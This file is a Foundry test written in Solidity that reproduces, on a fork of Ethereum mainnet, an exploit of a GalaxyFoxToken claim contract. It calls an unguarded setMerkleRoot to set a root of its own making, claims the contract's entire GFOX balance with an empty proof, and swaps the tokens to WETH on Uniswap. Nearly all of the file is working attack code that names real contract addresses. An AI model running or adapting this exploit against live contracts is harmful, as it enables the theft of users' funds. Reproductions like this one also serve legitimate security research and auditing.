// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/interface.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IVictim {
    function setMerkleRoot(bytes32 _merkleRoot) external;
    function claim(address to, uint256 amount, bytes32[] calldata proof) external;
}

contract GalaxyFoxTokenTest is Test {
    // Environment Configuration
    uint256 constant forkBlock = 19_835_924;
    address constant fundToken = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Variable
    address constant GFOX = 0x8F1CecE048Cade6b8a05dFA2f90EE4025F4F2662;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant Victim = 0x11A4a5733237082a6C08772927CE0a2B5f8A86B6;
    address constant Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    /// Modifier
    modifier BalanceLog() {
        console.log("Attacker Token Balance Before Exploit: ", getBalance(fundToken));
        _;
        console.log("Attacker Token Balance After Exploit: ", getBalance(fundToken));
    }

    // Balance Log
    function getBalance(address token) internal view returns (uint256) {
        if (token == address(0)) return address(this).balance;
        return IERC20(token).balanceOf(address(this));
    }

    // Environment Setup
    function setUp() public {
        vm.createSelectFork("mainnet", forkBlock);
        vm.deal(address(this), 0);

        vm.label(GFOX, "GFOX");
        vm.label(WETH, "WETH");
        vm.label(Victim, "Victim");
        vm.label(Router, "Router");
    }

    // Exploit Procedure
    function testExploit() public BalanceLog {
        uint256 victimGFoxTokenAmount = IERC20(GFOX).balanceOf(Victim);
        bytes32 root = keccak256(abi.encodePacked(address(this), victimGFoxTokenAmount));
        IVictim(Victim).setMerkleRoot(root);
        IVictim(Victim).claim(address(this), victimGFoxTokenAmount, new bytes32[](0));

        uint256 amountIn = IERC20(GFOX).balanceOf(address(this));
        uint256 amountOutMin = 0;
        address[] memory path = new address[](2);
        path[0] = GFOX;
        path[1] = WETH;
        address to = address(this);
        uint256 deadline = block.timestamp;

        IERC20(GFOX).approve(Router, amountIn);
        IUniswapV2Router(Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, amountOutMin, path, to, deadline
        );
    }
}
